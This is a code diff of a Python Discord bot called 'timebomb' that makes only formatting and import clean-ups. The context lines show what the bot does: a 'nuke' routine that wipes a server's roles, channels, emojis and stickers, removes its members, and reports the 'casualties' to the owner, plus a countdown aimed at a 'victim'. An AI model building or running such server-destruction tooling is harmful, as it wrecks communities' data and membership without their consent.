@@ -4,10 +4,9 @@ https://github.com/regulad/timebomb
 """
 
 import asyncio
-import json
 import logging
 import os
-from typing import Optional, List, Tuple, Type, Union
+from typing import Optional, List, Tuple, Union
 
 import discord
 from discord.ext import commands
@@ -52,6 +51,7 @@ async def nuke_members(guild: discord.Guild) -> Tuple[int, int]:  # Fails & memb
         else:
             members += 1
     return fails, members
+
 
 async def message_owner(bot: commands.Bot, *args, **kwargs) -> Union[discord.Message, List[discord.Message]]:
     """Sends a message to the owner(s) of the bot with these arguments."""
@@ -149,13 +149,13 @@ async def nuke(bot: commands.Bot, guild: discord.Guild) -> None:
     roles = role_results[1]
 
     status_string: str = (
-            f"Nuked {guild.name} ({guild.id}). "
-            f"Casualties: {roles} role(s), "
-            f"{emojis} emoji(s), "
-            f"{channels} channel(s), "
-            f"{stickers} stickers(s), "
-            f"and {members} member(s). "
-            f"Unable to delete {fails} models."
+        f"Nuked {guild.name} ({guild.id}). "
+        f"Casualties: {roles} role(s), "
+        f"{emojis} emoji(s), "
+        f"{channels} channel(s), "
+        f"{stickers} stickers(s), "
+        f"and {members} member(s). "
+        f"Unable to delete {fails} models."
     )
 
     await message_owner(bot, status_string)
@@ -216,6 +216,7 @@ async def countdown(bot: commands.Bot, victim: discord.Member, reason: str) -> b
 
 class TickTick(commands.Cog):
     """The main cog. Handles all functions."""
+
     def __init__(self, bot: commands.Bot) -> None:
         self.bot = bot
 
